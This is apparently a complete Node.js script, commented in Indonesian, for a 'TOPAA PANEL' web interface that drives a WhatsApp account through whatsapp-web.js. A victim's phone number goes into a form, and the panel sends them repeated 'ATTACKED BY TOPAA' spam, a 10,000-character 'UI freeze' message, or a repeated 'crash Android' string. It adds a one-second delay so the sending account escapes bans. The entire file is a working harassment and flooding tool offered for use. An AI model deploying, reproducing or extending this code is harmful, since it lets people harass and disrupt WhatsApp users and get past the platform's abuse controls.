const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// SETTINGAN PORT OTOMATIS RAILWAY
const port = process.env.PORT || 3000;

// MESIN ANTI-CRASH (KHUSUS SERVER CLOUD)
const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: { 
        headless: true, 
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox', 
            '--disable-dev-shm-usage', 
            '--no-zygote', 
            '--single-process', 
            '--disable-gpu'
        ] 
    }
});

// QR CODE AKAN MUNCUL DI TAB "LOGS" RAILWAY
client.on('qr', (qr) => {
    console.log('SCAN QR INI DI LOGS RAILWAY:');
    qrcode.generate(qr, {small: true});
});

client.on('ready', () => {
    console.log('✅ PANEL TOPAA SUDAH ONLINE!');
});

// TAMPILAN PANEL DI BROWSER IPHONE
app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>TOPAA PANEL V1</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #0a0a0a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
                .card { border: 2px solid #ff0055; background: #111; padding: 20px; border-radius: 15px; box-shadow: 0 0 15px #ff0055; max-width: 400px; margin: auto; }
                h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; margin-bottom: 5px; }
                p { font-size: 12px; color: #888; margin-bottom: 20px; }
                input, select, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #1a1a1a; color: white; font-size: 16px; }
                button { background: #ff0055; font-weight: bold; border: none; cursor: pointer; transition: 0.3s; }
                button:hover { background: #ff0077; transform: scale(1.02); }
                .footer { font-size: 10px; color: #444; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>TOPAA PANEL</h1>
                <p>STATUS: <span style="color: #00ff00;">CONNECTED</span></p>
                <form action="/attack" method="POST">
                    <input type="text" name="number" placeholder="628xxxxxxxxxx" required>
                    <select name="type">
                        <option value="spam">💥 FAST SPAM</option>
                        <option value="freeze">☣️ UI FREEZE</option>
                        <option value="crash">💀 CRASH ANDROID</option>
                    </select>
                    <input type="number" name="count" placeholder="Jumlah Pesan" value="10" required>
                    <button type="submit">EXECUTE ATTACK</button>
                </form>
                <div class="footer">MADE BY TOPAA - 2026</div>
            </div>
        </body>
        </html>
    `);
});

// PROSES PENGIRIMAN BUG
app.post('/attack', async (req, res) => {
    const { number, type, count } = req.body;
    const chatId = number + "@c.us";
    
    // NAMA SUDAH DIGANTI TOPAA
    let text = "🔥 ATTACKED BY TOPAA 🔥"; 

    if (type === "freeze") text = "░".repeat(10000);
    if (type === "crash") text = "Buffer-Crash-".repeat(1000);

    console.log(`[!] Menyerang: ${number} | Mode: ${type}`);

    for (let i = 0; i < count; i++) {
        try {
            await client.sendMessage(chatId, text);
            console.log(`[✔] Sent: ${i+1}`);
            await new Promise(r => setTimeout(r, 1000)); // Jeda 1 detik biar gak gampang ke-ban
        } catch (e) {
            console.log("Error: " + e);
        }
    }
    res.send('<h2>Serangan Selesai!</h2><a href="/" style="color:red;">KEMBALI KE PANEL</a>');
});

// LISTENING SERVER
app.listen(port, '0.0.0.0', () => {
    console.log('Server berjalan di port: ' + port);
});

client.initialize();
